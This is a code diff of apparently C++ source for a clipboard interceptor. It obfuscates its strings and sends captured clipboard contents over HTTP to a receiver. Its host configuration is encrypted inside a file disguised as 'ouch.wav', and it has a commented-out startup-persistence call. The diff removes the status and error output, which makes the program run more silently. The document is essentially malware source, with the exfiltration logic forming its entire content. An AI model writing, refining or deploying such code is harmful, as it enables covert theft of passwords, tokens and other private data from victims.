@@ -11,27 +11,21 @@
 
 void HandleNewData(std::string& data)
 {    
-    std::cout << OBFSTR("[*] New Clipboard Content:\n\n") << data << "\n\n";
-    std::cout << OBFSTR("Sending data to receiver...\n");
-
     try
     {
         ExfiltrateClipboardHTTP(data, "127.0.0.1", "/exfil", 80);
     }
     catch(const std::exception& ex)
     {
-        std::wcout << OBFSTR("Error when sending data to receiver: ") << ex.what() << "\n";
+        std::cout << ex.what() << "\n";
     }
     catch(...)
-    {
-        std::wcout << OBFSTR("Unknown exception occured when sending data to receiver.\n");
-    }
+    {}
 }
 
 int main() {
     // AddToStartup();
 
-    std::cout << OBFSTR("[*] Clipboard Interceptor Started\n");
     std::string lastClipboard = "";
 
     auto [host, port, path] = ExtractAndDecryptConfig(OBFSTR("ouch.wav"));
